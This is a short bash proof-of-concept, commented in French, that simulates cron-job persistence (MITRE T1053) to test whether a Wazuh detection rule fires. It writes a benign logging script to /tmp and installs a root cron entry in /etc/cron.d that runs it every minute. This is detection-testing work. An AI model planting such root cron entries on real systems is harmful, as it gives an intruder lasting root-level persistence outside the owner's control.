#!/bin/bash
# =====================================================================
# PoC 1 — Persistance via Cron Job malveillant
# MITRE ATT&CK : T1053 (Scheduled Task/Cron)
# Détection attendue : Règle Wazuh 100005 (Niveau 10)
# =====================================================================

echo "[*] Injection d'une tâche Cron malveillante..."

cat > /tmp/backdoor.sh << 'EOF'
#!/bin/bash
echo "backdoor executed at $(date)" >> /tmp/backdoor.log
EOF

chmod +x /tmp/backdoor.sh
echo "* * * * * root /tmp/backdoor.sh" > /etc/cron.d/backdoor_test

echo "[+] Tâche Cron injectée dans /etc/cron.d/backdoor_test"
echo "[+] Alerte Niveau 10 attendue (règle 100005)"